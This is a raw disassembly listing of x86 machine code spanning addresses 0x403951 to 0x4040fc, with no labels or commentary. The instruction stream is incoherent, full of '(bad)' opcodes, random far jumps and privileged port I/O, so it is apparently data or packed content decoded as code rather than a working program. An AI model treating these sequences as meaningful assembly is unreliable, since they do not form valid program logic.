  403951:	adc    DWORD PTR [edi],eax
  403953:	add    eax,0x249accf
  403958:	xor    esi,edx
  40395a:	xor    al,0x3f
  40395c:	dec    esi
  40395d:	test   eax,0x61637c7c
  403962:	cmp    BYTE PTR [esi+0x14],bl
  403965:	dec    ecx
  403966:	arpl   WORD PTR [edi],si
  403968:	and    ecx,DWORD PTR [esi]
  40396a:	aas    
  40396b:	imul   ebx,DWORD PTR [esi-0x437e35f0],0x2df64fa6
  403975:	pusha  
  403976:	test   DWORD PTR [ebx],eax
  403978:	dec    esp
  403979:	dec    esi
  40397a:	loop   0x4039f0
  40397c:	and    BYTE PTR [esp+ecx*1+0x4b],ah
  403980:	shl    BYTE PTR [ecx-0x1eaee19a],0x21
  403987:	adc    eax,0x63ea5e81
  40398c:	mov    dh,al
  40398e:	getsec 
  403990:	dec    ecx
  403991:	xchg   edx,eax
  403992:	sub    eax,0x542c9fa0
  403997:	sub    al,0x8e
  403999:	sub    ch,al
  40399b:	or     BYTE PTR [edx-0x51dcb64f],ch
  4039a1:	sub    DWORD PTR [edi+0x13],ebp
  4039a4:	jnp    0x40395e
  4039a6:	xchg   DWORD PTR [edi+0x52],esi
  4039a9:	outs   dx,BYTE PTR ds:[esi]
  4039aa:	inc    ecx
  4039ab:	xor    BYTE PTR [esi-0x10],bl
  4039ae:	ins    BYTE PTR es:[edi],dx
  4039af:	cs stc 
  4039b1:	pop    ecx
  4039b2:	sti    
  4039b3:	sbb    ch,BYTE PTR [edx-0x5c]
  4039b6:	daa    
  4039b7:	add    al,0x31
  4039b9:	loopne 0x4039ee
  4039bb:	xlat   BYTE PTR ds:[ebx]
  4039bc:	dec    ecx
  4039bd:	outs   dx,DWORD PTR ds:[esi]
  4039be:	out    0x54,eax
  4039c0:	ss lods al,BYTE PTR ds:[esi]
  4039c3:	pop    ds
  4039c4:	push   es
  4039c5:	sbb    eax,0x952c9443
  4039ca:	mov    dh,0x32
  4039cc:	jg     0x4039eb
  4039ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039cf:	pop    eax
  4039d0:	sbb    DWORD PTR [edx+edi*1],edi
  4039d3:	ds add ecx,edi
  4039d6:	jmp    0x758a29b4
  4039db:	ss push edi
  4039dd:	pop    ecx
  4039de:	sub    eax,0xba1720ad
  4039e3:	add    al,0x24
  4039e5:	in     al,0x6e
  4039e7:	ja     0x403a60
  4039e9:	xor    al,0xd1
  4039eb:	shl    DWORD PTR [ecx-0x391019f5],1
  4039f1:	push   es
  4039f2:	loopne 0x403a44
  4039f4:	jo     0x4039e1
  4039f6:	fnstsw WORD PTR [eax]
  4039f8:	in     eax,0xb7
  4039fa:	inc    BYTE PTR [eax]
  4039fc:	dec    edi
  4039fd:	(bad)  
  4039fe:	lahf   
  4039ff:	sbb    bl,BYTE PTR [edi-0x7d]
  403a02:	mov    al,0xdf
  403a04:	out    0xae,eax
  403a06:	scas   eax,DWORD PTR es:[edi]
  403a07:	(bad)  
  403a09:	pop    edi
  403a0a:	neg    bh
  403a0c:	or     DWORD PTR es:[eax-0x46638b2b],0x9941fc6c
  403a17:	(bad)  
  403a18:	xchg   ecx,eax
  403a19:	sub    al,0xec
  403a1b:	mov    es,WORD PTR [edx+ebx*2+0x65]
  403a1f:	mov    esp,0x4c28668d
  403a24:	cmp    DWORD PTR [edx],ebx
  403a26:	and    cl,BYTE PTR [esi]
  403a28:	mov    ?,WORD PTR [edi-0x66]
  403a2b:	loop   0x403a46
  403a2d:	sahf   
  403a2e:	sbb    ecx,DWORD PTR [esi-0x45d88619]
  403a34:	adc    eax,0xa7c9b64b
  403a39:	sub    eax,0x8d7f8e7d
  403a3e:	fistp  QWORD PTR [ecx]
  403a40:	add    DWORD PTR [eax+ebp*1+0x72],esp
  403a44:	push   ecx
  403a45:	or     DWORD PTR [eax+0xf],0x16
  403a49:	lods   al,BYTE PTR ds:[esi]
  403a4a:	pusha  
  403a4b:	not    BYTE PTR [ebx-0x36]
  403a4e:	pop    es
  403a4f:	dec    edx
  403a50:	int    0x6
  403a52:	in     al,0x4e
  403a54:	sbb    BYTE PTR [ebp+0xa5ea115],dh
  403a5a:	and    eax,0x4e1930f4
  403a5f:	adc    al,0x28
  403a61:	loopne 0x403a8f
  403a63:	mov    DWORD PTR [edi],ebx
  403a65:	rcr    DWORD PTR [ebx-0x7a255fc2],cl
  403a6b:	ja     0x403a29
  403a6d:	out    dx,al
  403a6e:	jle    0x403a90
  403a70:	ds dec edx
  403a72:	cld    
  403a73:	add    BYTE PTR [edi+ecx*1],dl
  403a76:	sbb    al,0xbc
  403a78:	push   esp
  403a79:	ja     0x403a58
  403a7b:	pop    ecx
  403a7c:	test   bl,dl
  403a7e:	not    BYTE PTR [edx+0x3b]
  403a81:	outs   dx,WORD PTR ds:[esi]
  403a83:	retf   
  403a84:	loop   0x403a7c
  403a86:	fsub   QWORD PTR [esi+ebx*2-0x614cb9e8]
  403a8d:	cmp    BYTE PTR [eax-0x4a],0x80
  403a91:	mov    bh,0xdc
  403a93:	mov    ebp,0xc1110da3
  403a98:	jbe    0x403a8d
  403a9a:	sbb    DWORD PTR [esi+0x2c],esi
  403a9d:	aas    
  403a9e:	push   eax
  403a9f:	adc    eax,0x611ecff6
  403aa4:	dec    ebx
  403aa5:	jp     0x403a61
  403aa7:	pop    es
  403aa8:	fimul  WORD PTR [ebp+0x128eaa6]
  403aae:	clc    
  403aaf:	pop    eax
  403ab0:	or     eax,0x7f6304b5
  403ab5:	mov    ebp,0xf841ea65
  403aba:	je     0x403b0a
  403abc:	out    0x4,al
  403abe:	sahf   
  403abf:	sbb    bl,al
  403ac1:	mov    ds:0x90b4a684,eax
  403ac6:	into   
  403ac7:	xlat   BYTE PTR ds:[ebx]
  403ac8:	pushf  
  403ac9:	cmp    BYTE PTR [ebx+0x3c],al
  403acc:	mov    bl,0xf8
  403ace:	xor    ebx,edx
  403ad0:	xor    DWORD PTR [eax],eax
  403ad2:	add    BYTE PTR [eax-0x49f287dd],0x56
  403ad9:	adc    cl,BYTE PTR [esi+0x49790c13]
  403adf:	popa   
  403ae0:	mov    dh,0x67
  403ae2:	dec    edi
  403ae3:	mov    ah,0x6a
  403ae5:	xor    al,0x60
  403ae7:	scas   al,BYTE PTR es:[edi]
  403ae8:	iret   
  403ae9:	fwait
  403aea:	add    al,0x56
  403aec:	mov    esi,0x1066043c
  403af1:	inc    edi
  403af2:	mov    eax,ds:0xb4801a1c
  403af7:	(bad)  
  403af8:	jmp    0x4721:0x3cb2150c
  403aff:	or     eax,DWORD PTR [eax-0x664bf7d1]
  403b05:	mov    ?,WORD PTR [ebp+0x22f75285]
  403b0b:	push   eax
  403b0c:	fsubrp st(7),st
  403b0e:	enter  0x2723,0x2e
  403b12:	xlat   BYTE PTR ds:[ebx]
  403b13:	mov    ch,BYTE PTR [ecx]
  403b15:	inc    esi
  403b16:	mov    esi,0xef7f8ee1
  403b1b:	mov    ah,0x5e
  403b1d:	sbb    BYTE PTR [ebx+0x4b],bh
  403b20:	fmul   st,st(4)
  403b22:	mov    WORD PTR [eax+ecx*4],?
  403b25:	mov    ecx,0x16a475f4
  403b2a:	popf   
  403b2b:	sub    eax,0xcc557e21
  403b30:	daa    
  403b31:	jmp    0x7b5d:0x329c85f4
  403b38:	fsub   DWORD PTR [edx-0x7437728f]
  403b3e:	mov    ah,0x87
  403b40:	cdq    
  403b41:	(bad)  
  403b42:	lea    ebp,[edx+edi*8-0x147bf6f1]
  403b49:	jg     0x403b3b
  403b4b:	jmp    0x403bb7
  403b4d:	fist   DWORD PTR [edi]
  403b4f:	jae    0x403b99
  403b51:	mov    esi,0x5d98374c
  403b56:	outs   dx,DWORD PTR ds:[esi]
  403b57:	sub    BYTE PTR [edx],ah
  403b59:	movq   mm2,mm0
  403b5c:	dec    esp
  403b5d:	cmp    al,0xda
  403b5f:	pop    eax
  403b60:	test   eax,0x7690fb74
  403b65:	scas   eax,DWORD PTR es:[edi]
  403b66:	icebp  
  403b67:	sbb    edi,DWORD PTR [ecx+edi*8+0x57f878b7]
  403b6e:	scas   eax,DWORD PTR es:[edi]
  403b6f:	jmp    0xc020:0x6df46cf1
  403b76:	stos   DWORD PTR es:[di],eax
  403b78:	popa   
  403b79:	mov    ah,0xa8
  403b7b:	aaa    
  403b7c:	pop    edi
  403b7d:	icebp  
  403b7e:	inc    ebx
  403b7f:	test   edi,esi
  403b81:	adc    al,0x66
  403b83:	push   ds
  403b84:	sub    eax,0x23dabceb
  403b89:	pop    ebx
  403b8a:	sub    eax,0x9a0bf6fb
  403b8f:	jno    0x403b2d
  403b91:	(bad)  
  403b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b93:	addr16 out dx,al
  403b95:	dec    edi
  403b96:	mov    BYTE PTR [ecx-0x6e],dh
  403b99:	push   eax
  403b9a:	push   0x33db2993
  403b9f:	pop    es
  403ba0:	xchg   esp,eax
  403ba1:	mov    bl,0x3d
  403ba3:	lods   eax,DWORD PTR ds:[esi]
  403ba4:	jge    0x403b7e
  403ba6:	fdiv   DWORD PTR ds:0x75c82bd3
  403bac:	mov    dh,0xc5
  403bae:	sbb    DWORD PTR [ecx],edx
  403bb0:	jne    0x403b43
  403bb2:	ja     0x403c17
  403bb4:	stos   BYTE PTR es:[edi],al
  403bb5:	scas   eax,DWORD PTR es:[edi]
  403bb6:	cmp    DWORD PTR [esi-0x70],ebx
  403bb9:	call   0xd402:0x49a7ce24
  403bc0:	(bad)  
  403bc1:	jle    0x403b8d
  403bc3:	ds push edi
  403bc5:	mov    DWORD PTR [esi*4+0x5b30ee1],0x1321afa4
  403bd0:	jp     0x403ba0
  403bd2:	addr16 xchg ecx,eax
  403bd4:	lods   al,BYTE PTR ds:[esi]
  403bd5:	xchg   DWORD PTR [eax+0xeae839a],esp
  403bdb:	xor    DWORD PTR [ecx],esp
  403bdd:	sbb    eax,0x975f3125
  403be2:	out    0x56,al
  403be4:	addr16 xor eax,0x68927d26
  403bea:	cli    
  403beb:	rol    DWORD PTR [ecx],cl
  403bed:	add    DWORD PTR [eax],0xffffffeb
  403bf0:	in     al,dx
  403bf1:	xor    edi,edi
  403bf3:	add    BYTE PTR [ebx+0x3e089950],bl
  403bf9:	mov    esi,0xe1788cfb
  403bfe:	and    al,0xa5
  403c00:	mov    bl,0x53
  403c02:	mov    al,0x50
  403c04:	cdq    
  403c05:	dec    eax
  403c06:	ja     0x403c04
  403c08:	and    al,BYTE PTR [edi+ecx*8]
  403c0b:	in     al,0x4c
  403c0d:	sti    
  403c0e:	sti    
  403c0f:	sub    DWORD PTR [ecx+ebp*8+0x11],esi
  403c13:	or     bh,BYTE PTR [esi-0x64f4e836]
  403c19:	xor    DWORD PTR [eax],esp
  403c1b:	mov    ch,0xbc
  403c1d:	jp     0x403bea
  403c1f:	push   ecx
  403c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c21:	jo     0x403bf1
  403c23:	sub    eax,DWORD PTR [esi+0x75]
  403c26:	push   0x1808e40
  403c2b:	mov    dh,0xbd
  403c2d:	out    dx,al
  403c2e:	(bad)  
  403c2f:	hlt    
  403c30:	imul   eax,DWORD PTR [eax],0x71
  403c33:	pop    edx
  403c34:	cmp    bl,al
  403c36:	gs jne 0x403c17
  403c39:	xchg   ecx,eax
  403c3a:	mov    DWORD PTR [esi-0x6b5f3d7f],esi
  403c40:	inc    esi
  403c41:	push   esp
  403c42:	(bad)  
  403c44:	jge    0x403c95
  403c46:	jmp    0x100d:0xad720d4a
  403c4d:	rcr    DWORD PTR [eax],cl
  403c4f:	dec    BYTE PTR [eax+0x3400b9f9]
  403c55:	or     eax,0x3309eef9
  403c5a:	(bad)  
  403c5b:	lahf   
  403c5c:	cli    
  403c5d:	sub    ebx,DWORD PTR [ebp+0x568e0e8f]
  403c63:	mov    edx,0xa376a300
  403c68:	imul   edi,DWORD PTR [ebx],0x3660ad3a
  403c6e:	lds    ebp,FWORD PTR [ecx-0x5c279295]
  403c74:	ret    
  403c75:	out    0xdc,eax
  403c77:	pop    eax
  403c78:	and    DWORD PTR [edx*8-0x4a65caa],0xffffffe6
  403c80:	test   BYTE PTR [eax],ah
  403c82:	inc    edi
  403c83:	jns    0x403cc4
  403c85:	ja     0x403ca0
  403c87:	nop
  403c88:	adc    DWORD PTR [eax-0x3f],ebp
  403c8b:	aam    0xf
  403c8d:	pop    edx
  403c8e:	jl     0x403cf7
  403c90:	sub    BYTE PTR [esi-0x4b1bd7c3],bl
  403c96:	add    esi,DWORD PTR [edi+0x5c]
  403c99:	stos   DWORD PTR es:[edi],eax
  403c9a:	ret    0x8588
  403c9d:	push   es
  403c9e:	mov    bh,BYTE PTR [eax+0x14]
  403ca1:	adc    al,0x9b
  403ca3:	adc    DWORD PTR [edx+esi*1+0x490ca52d],esi
  403caa:	pop    eax
  403cab:	(bad)  
  403cac:	rcr    BYTE PTR [esi],cl
  403cae:	enter  0x806f,0xff
  403cb2:	rol    BYTE PTR [ebp+0x121b9546],cl
  403cb8:	sbb    edi,edx
  403cba:	cmp    al,0x14
  403cbc:	mov    bh,0x34
  403cbe:	mov    edi,0xe31bff67
  403cc3:	sub    ah,BYTE PTR [eax+0x2cba05e8]
  403cc9:	in     al,dx
  403cca:	icebp  
  403ccb:	pop    ds
  403ccc:	inc    ebp
  403ccd:	lods   al,BYTE PTR ds:[esi]
  403cce:	push   edx
  403ccf:	and    BYTE PTR [edi],cl
  403cd1:	inc    eax
  403cd2:	jl     0x403c88
  403cd4:	xor    dl,dh
  403cd6:	xchg   ebp,eax
  403cd7:	ss xchg esp,eax
  403cd9:	mov    cl,bl
  403cdb:	or     dh,dh
  403cdd:	les    esi,FWORD PTR [ebx+esi*2]
  403ce0:	pop    ebp
  403ce1:	mov    ebp,0xff7d28b7
  403ce6:	push   cs
  403ce7:	out    0x8c,al
  403ce9:	dec    ecx
  403cea:	inc    edi
  403ceb:	fdiv   QWORD PTR [eax-0x5ce1e51a]
  403cf1:	sbb    edi,DWORD PTR [edx+0x12099562]
  403cf7:	sbb    al,0x27
  403cf9:	sub    bl,BYTE PTR ds:0xefa22f7f
  403cff:	adc    edi,esp
  403d01:	mov    ds:0xafd01348,eax
  403d06:	iret   
  403d07:	mov    eax,0xaf96b606
  403d0c:	aas    
  403d0d:	mov    esi,DWORD PTR [edi]
  403d0f:	mov    BYTE PTR [ebx],al
  403d11:	leave  
  403d12:	je     0x403cc2
  403d14:	push   edi
  403d15:	pop    ecx
  403d16:	cli    
  403d17:	push   ebp
  403d18:	gs push ecx
  403d1a:	xchg   esp,eax
  403d1b:	mov    es,esp
  403d1d:	std    
  403d1e:	add    ebp,ebx
  403d20:	sub    DWORD PTR [ecx],esp
  403d22:	fisubr DWORD PTR [eax-0x65]
  403d25:	je     0x403d97
  403d27:	ret    0xd1fc
  403d2a:	xor    DWORD PTR [edx],esi
  403d2c:	inc    edx
  403d2d:	out    0x4f,eax
  403d2f:	cmp    DWORD PTR [edi-0x3d],esi
  403d32:	mov    al,ds:0x8fbb0c9
  403d37:	mul    DWORD PTR [esp+ebp*2]
  403d3a:	xchg   ecx,eax
  403d3b:	mov    BYTE PTR ss:[esi+0x61],dh
  403d3f:	clc    
  403d40:	js     0x403d8c
  403d42:	push   cs
  403d43:	xor    eax,edx
  403d45:	repz imul ecx,edi,0xfffffff0
  403d49:	fwait
  403d4a:	outs   dx,BYTE PTR ds:[esi]
  403d4b:	mov    eax,0x941aba37
  403d50:	sub    BYTE PTR [eax],dh
  403d52:	sahf   
  403d53:	cmp    dh,BYTE PTR [ecx+0x4]
  403d56:	jnp    0x403db4
  403d58:	leave  
  403d59:	call   0x3fb1:0xd1df1a05
  403d60:	push   ebp
  403d61:	pop    esi
  403d62:	sub    eax,0xaa7040bf
  403d67:	ror    BYTE PTR [edi-0x7c529431],0x40
  403d6e:	ror    DWORD PTR [ebp+0x6d],1
  403d71:	dec    esi
  403d72:	mov    esp,0x8629743f
  403d77:	mov    ds:0x6c664e28,eax
  403d7c:	add    eax,0x3c79f50d
  403d81:	idiv   BYTE PTR [esi]
  403d83:	popf   
  403d84:	daa    
  403d85:	repz (bad) 
  403d87:	mov    ah,0xc8
  403d89:	cmp    ch,BYTE PTR [eax]
  403d8b:	dec    ebx
  403d8c:	cmc    
  403d8d:	mov    edx,0x9f9649a0
  403d92:	test   eax,0x864374cb
  403d97:	cmc    
  403d98:	(bad)  
  403d99:	in     eax,0xbe
  403d9b:	mov    DWORD PTR [edi+esi*4+0x3c],esi
  403d9f:	cld    
  403da0:	loope  0x403d70
  403da2:	sbb    DWORD PTR [ecx],eax
  403da4:	dec    edi
  403da5:	mov    ds:0x17f61b5e,al
  403daa:	lea    edi,[eax-0xd]
  403dad:	mov    eax,ds:0x907d319e
  403db2:	dec    edi
  403db3:	call   0x9bd7bddf
  403db8:	arpl   WORD PTR [ebx],bx
  403dba:	rcr    BYTE PTR [ebp-0x7c1e215f],1
  403dc0:	adc    al,BYTE PTR [esi]
  403dc2:	jb     0x403e2d
  403dc4:	jg     0x403db1
  403dc6:	cmp    BYTE PTR [esi],0xfe
  403dc9:	push   eax
  403dca:	cdq    
  403dcb:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  403dcd:	mov    al,0x1b
  403dcf:	bound  ecx,QWORD PTR [esi+0x66]
  403dd2:	test   al,0x36
  403dd4:	adc    eax,0xe5861d3f
  403dd9:	pusha  
  403dda:	outs   dx,DWORD PTR ds:[esi]
  403ddb:	jne    0x403e26
  403ddd:	pushf  
  403dde:	push   es
  403ddf:	nop
  403de0:	ja     0x403e22
  403de2:	cmp    edx,edi
  403de4:	mov    eax,ds:0xa113d043
  403de9:	cs jge 0x403dda
  403dec:	inc    esi
  403ded:	aad    0x8d
  403def:	(bad)  
  403df0:	sub    al,0xfe
  403df2:	xchg   ebp,eax
  403df3:	ret    
  403df4:	scas   eax,DWORD PTR es:[edi]
  403df5:	aaa    
  403df6:	sahf   
  403df7:	sub    al,0x78
  403df9:	test   eax,0xe6157937
  403dfe:	repz icebp 
  403e00:	jg     0x403dfa
  403e02:	fdiv   DWORD PTR [edi+0x37]
  403e05:	push   es
  403e06:	lods   al,BYTE PTR ds:[esi]
  403e07:	call   0x4623c41e
  403e0c:	es and bh,cl
  403e0f:	out    0xda,eax
  403e11:	sahf   
  403e12:	idiv   DWORD PTR [esp+eax*8]
  403e15:	aam    0xb5
  403e17:	cmc    
  403e18:	and    eax,0x20160bad
  403e1d:	dec    edx
  403e1e:	inc    ebx
  403e1f:	xor    BYTE PTR [ecx-0x291399a],al
  403e25:	jns    0x403e01
  403e27:	add    DWORD PTR [eax+esi*8+0x63690e7b],edi
  403e2e:	imul   ebp,DWORD PTR [ebx+0x527136dd],0x6e
  403e35:	mov    ebp,0xe0a92575
  403e3a:	dec    edx
  403e3b:	aaa    
  403e3c:	jns    0x403eb0
  403e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e3f:	xchg   DWORD PTR [ebx-0x3faa0589],edx
  403e45:	xchg   DWORD PTR [edi-0x1756da99],edi
  403e4b:	xor    al,0x6c
  403e4d:	dec    eax
  403e4e:	fcom   DWORD PTR [ebx]
  403e50:	(bad)  
  403e51:	leave  
  403e52:	mov    dh,0xf5
  403e54:	ins    BYTE PTR es:[edi],dx
  403e55:	pop    es
  403e56:	inc    esi
  403e57:	shl    BYTE PTR [eax-0x7c],0x60
  403e5b:	adc    al,ch
  403e5d:	hlt    
  403e5e:	jne    0x403e5f
  403e60:	pushf  
  403e61:	jae    0x403ec4
  403e63:	or     esp,0x23
  403e66:	cs dec esp
  403e68:	xchg   BYTE PTR [esi+0x35b2051f],ch
  403e6e:	out    0xf3,al
  403e70:	dec    edi
  403e71:	adc    BYTE PTR [eax],dh
  403e73:	sbb    ecx,eax
  403e75:	cld    
  403e76:	daa    
  403e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e78:	add    DWORD PTR [edx-0x7e],edx
  403e7b:	cmp    ecx,ebx
  403e7d:	(bad)  
  403e7e:	loope  0x403ee1
  403e80:	(bad)  
  403e81:	jmp    0x403e57
  403e83:	dec    esi
  403e84:	test   al,0xb4
  403e86:	add    dl,al
  403e88:	outs   dx,DWORD PTR ds:[esi]
  403e89:	leave  
  403e8a:	outs   dx,BYTE PTR ds:[esi]
  403e8b:	pop    edi
  403e8c:	(bad)  
  403e8d:	je     0x403e20
  403e8f:	adc    DWORD PTR [ebx],edi
  403e91:	shl    ah,cl
  403e93:	jb     0x403e2b
  403e95:	test   eax,esp
  403e97:	pop    ss
  403e98:	add    esi,ebp
  403e9a:	add    esi,DWORD PTR [eax-0x2fd732cc]
  403ea0:	ds nop
  403ea2:	mov    ds:0x2abc1128,eax
  403ea7:	xor    DWORD PTR [edx+eiz*2-0x3e18bf3c],0x33b61d6c
  403eb2:	mul    bh
  403eb4:	inc    ecx
  403eb5:	clc    
  403eb6:	cmp    al,0x7d
  403eb8:	xor    eax,0x2537fd40
  403ebd:	imul   DWORD PTR [ebx]
  403ebf:	lods   eax,DWORD PTR ds:[esi]
  403ec0:	in     al,0x53
  403ec2:	dec    ecx
  403ec3:	and    al,0x0
  403ec5:	push   ebp
  403ec6:	jb     0x403f06
  403ec8:	fsubr  DWORD PTR [ebx-0x62]
  403ecb:	ja     0x403ea0
  403ecd:	jbe    0x403e81
  403ecf:	jae    0x403e7b
  403ed1:	push   eax
  403ed2:	dec    esp
  403ed3:	stc    
  403ed4:	mov    edi,0x48121672
  403ed9:	sahf   
  403eda:	cmp    eax,DWORD PTR [ecx+0x297ffdc8]
  403ee0:	xchg   esi,eax
  403ee1:	ja     0x403e6a
  403ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ee4:	popa   
  403ee5:	(bad)  
  403ee6:	and    esp,ebx
  403ee8:	mov    ecx,0x58026ab7
  403eed:	sub    al,0x23
  403eef:	fld    TBYTE PTR [edx+0x1f9de51a]
  403ef5:	les    eax,FWORD PTR [ecx+esi*2-0x13]
  403ef9:	add    eax,0x1757381e
  403efe:	test   eax,0x25932551
  403f03:	jg     0x403f00
  403f05:	lods   eax,DWORD PTR ds:[esi]
  403f06:	dec    ebp
  403f07:	fild   WORD PTR [esp+edi*1]
  403f0a:	jle    0x403ee2
  403f0c:	cli    
  403f0d:	aas    
  403f0e:	in     al,0x28
  403f10:	xor    DWORD PTR [eax],ebp
  403f12:	add    ebp,DWORD PTR [esi+esi*1-0x65fdc708]
  403f19:	shr    dl,cl
  403f1b:	out    0xe2,al
  403f1d:	pop    ecx
  403f1e:	or     al,0xaf
  403f20:	xor    esp,DWORD PTR [ebx-0x70]
  403f23:	in     al,dx
  403f24:	add    ebp,edx
  403f26:	and    BYTE PTR [ecx-0xf5bbd0d],0x34
  403f2d:	faddp  st(2),st
  403f2f:	jg     0x403f03
  403f31:	mov    cl,0xfa
  403f33:	jmp    0x403f61
  403f35:	xlat   BYTE PTR ds:[ebx]
  403f36:	mov    esi,0xa51eba03
  403f3b:	mov    WORD PTR [edx+0x34363f16],?
  403f41:	outs   dx,DWORD PTR ds:[esi]
  403f42:	adc    al,0xc7
  403f44:	or     DWORD PTR [edi-0x26],eax
  403f47:	jecxz  0x403f56
  403f49:	push   ds
  403f4a:	pop    ebp
  403f4b:	outs   dx,DWORD PTR ds:[esi]
  403f4c:	jle    0x403ed6
  403f4e:	repnz or edx,DWORD PTR [esi-0x69a0f4e7]
  403f55:	push   eax
  403f56:	(bad)  
  403f57:	js     0x403fa5
  403f59:	out    dx,eax
  403f5a:	sub    edi,DWORD PTR [ecx+edx*8+0x53]
  403f5e:	sbb    ebp,DWORD PTR [ebx]
  403f60:	jbe    0x403f61
  403f62:	and    DWORD PTR [edx-0x5552e6b],esp
  403f68:	mov    DWORD PTR [ebx+esi*8-0x6ff337a4],eax
  403f6f:	dec    edx
  403f70:	inc    ebx
  403f71:	pop    esi
  403f72:	mov    esi,DWORD PTR [ebx-0x48]
  403f75:	mov    edx,0x1c96e803
  403f7a:	add    BYTE PTR [ebx-0x4e53b19d],al
  403f80:	pop    esp
  403f81:	inc    esi
  403f82:	fbld   TBYTE PTR ds:0x7557fdd1
  403f88:	jecxz  0x403f70
  403f8a:	(bad)  
  403f8b:	(bad)  [edi]
  403f8d:	xor    DWORD PTR [ebx+0x422d80c0],eax
  403f93:	fsub   st(1),st
  403f95:	ss aad 0xdd
  403f98:	int    0x8d
  403f9a:	lods   eax,DWORD PTR ds:[esi]
  403f9b:	in     al,dx
  403f9c:	mov    ebp,0x3ef957a9
  403fa1:	dec    edx
  403fa2:	(bad)  
  403fa3:	and    al,BYTE PTR [ebx-0x56]
  403fa6:	fxch   st(0)
  403fa8:	lea    edi,[eax]
  403faa:	call   0xe679:0xae62481
  403fb1:	(bad)
  403fb4:	stc    
  403fb5:	fidivr WORD PTR [edx-0x2e]
  403fb8:	jbe    0x403fa5
  403fba:	fdiv   DWORD PTR [ebp+0x58]
  403fbd:	xchg   edi,eax
  403fbe:	inc    eax
  403fbf:	push   esp
  403fc0:	push   0x4ad99cf3
  403fc5:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  403fc7:	ret    0x50d2
  403fca:	xchg   edi,eax
  403fcb:	adc    al,0xca
  403fcd:	dec    eax
  403fce:	ins    BYTE PTR es:[edi],dx
  403fcf:	leave  
  403fd0:	sub    cl,BYTE PTR [eax+eax*2]
  403fd3:	clc    
  403fd4:	scas   al,BYTE PTR es:[edi]
  403fd5:	mov    ax,ds:0x50f06175
  403fdb:	popf   
  403fdc:	jne    0x404045
  403fde:	xchg   ebx,eax
  403fdf:	lods   eax,DWORD PTR ds:[esi]
  403fe0:	jp     0x403f72
  403fe2:	adc    ch,BYTE PTR [ecx+0x66]
  403fe5:	lea    ebp,[ebx+0x49]
  403fe8:	(bad)  
  403fea:	xchg   ebp,eax
  403feb:	sub    eax,0x41679576
  403ff0:	cmp    eax,DWORD PTR [esi+0x3b]
  403ff3:	jbe    0x403fd0
  403ff5:	or     DWORD PTR [edx+ebx*8-0x52f78f78],ecx
  403ffc:	xor    eax,0x5fc5c96e
  404001:	ficom  DWORD PTR ds:0x7b2392c4
  404007:	mov    al,ds:0xa179dc3a
  40400c:	pop    edx
  40400d:	enter  0xfdad,0xac
  404011:	pop    eax
  404012:	dec    edx
  404013:	and    eax,ecx
  404015:	xlat   BYTE PTR ds:[ebx]
  404016:	mov    WORD PTR [edx-0x21a6c8fd],fs
  40401c:	push   cs
  40401d:	mov    bh,0x2c
  40401f:	out    dx,eax
  404020:	push   es
  404021:	push   0xc
  404023:	idiv   DWORD PTR [ebx-0x1581b657]
  404029:	adc    eax,edx
  40402b:	cmc    
  40402c:	fild   DWORD PTR [eax-0x7b]
  40402f:	xor    al,0x3d
  404031:	scas   eax,DWORD PTR es:[edi]
  404032:	shl    edx,0x2b
  404035:	(bad)  
  404036:	int3   
  404037:	shl    BYTE PTR [ebx-0x572e95b3],0x19
  40403e:	loop   0x403ff3
  404040:	mov    ecx,0xbdb6cb81
  404045:	mov    edx,0x1b7e3446
  40404a:	int3   
  40404b:	test   BYTE PTR [eax+ecx*1+0x6d],dl
  40404f:	jge    0x4040c2
  404051:	sbb    al,0x10
  404053:	test   eax,0x8842614
  404058:	bound  esp,QWORD PTR [ecx-0x50]
  40405b:	push   edx
  40405c:	xchg   edi,eax
  40405d:	out    dx,eax
  40405e:	mov    edi,0xacfe9a58
  404063:	(bad)  
  404064:	and    ch,BYTE PTR [edi-0x247f1d95]
  40406a:	ins    DWORD PTR es:[edi],dx
  40406b:	mov    ebp,0xf6641b84
  404070:	cld    
  404071:	mov    ebp,0x6b3d90e8
  404076:	out    dx,eax
  404077:	jge    0x4040d3
  404079:	mov    edx,ecx
  40407b:	dec    ecx
  40407c:	loop   0x40407a
  40407e:	sub    dl,bh
  404080:	daa    
  404081:	ror    DWORD PTR [esi-0x29],cl
  404084:	or     eax,0xf4453b7f
  404089:	jecxz  0x404093
  40408b:	dec    eax
  40408c:	xchg   BYTE PTR [esi+0xd],dl
  40408f:	add    esp,DWORD PTR [ecx]
  404091:	out    0x2c,al
  404093:	push   edi
  404094:	mov    DWORD PTR [ebx+0x52],ecx
  404097:	mov    esi,0xb9ca70fe
  40409c:	lock mov ds:0x58c309ec,eax
  4040a2:	inc    esp
  4040a3:	jmp    0x4040af
  4040a5:	adc    eax,0xb744fe5c
  4040aa:	mov    dl,0x44
  4040ad:	pop    edx
  4040ae:	mov    ebx,0x5b7c3e24
  4040b3:	mov    DWORD PTR ds:0x4ea26a13,edi
  4040b9:	outs   dx,DWORD PTR ds:[esi]
  4040ba:	sbb    edi,esi
  4040bc:	mov    ds:0x389b9838,al
  4040c1:	jmp    0x109d:0xbce6126b
  4040c8:	sub    al,0x5f
  4040ca:	xchg   ebx,eax
  4040cb:	lahf   
  4040cc:	or     bh,BYTE PTR [ebp+eax*4+0xd68ce5f]
  4040d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040d4:	or     ah,BYTE PTR [edi+0x54e31142]
  4040da:	imul   esi,DWORD PTR [esi+0x562c9442],0xffffffe7
  4040e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040e2:	ins    BYTE PTR es:[edi],dx
  4040e3:	xor    BYTE PTR [ebx],bl
  4040e5:	popf   
  4040e6:	fadd   DWORD PTR [eax-0x1a]
  4040e9:	jl     0x404076
  4040eb:	mov    ch,0xa1
  4040ed:	stc    
  4040ee:	mov    dl,0x36
  4040f0:	enter  0xfe0e,0x4b
  4040f4:	push   eax
  4040f5:	not    ch
  4040f7:	sub    edi,DWORD PTR [ebp-0x59]
  4040fa:	neg    BYTE PTR [edi]
  4040fc:	in     al,dx
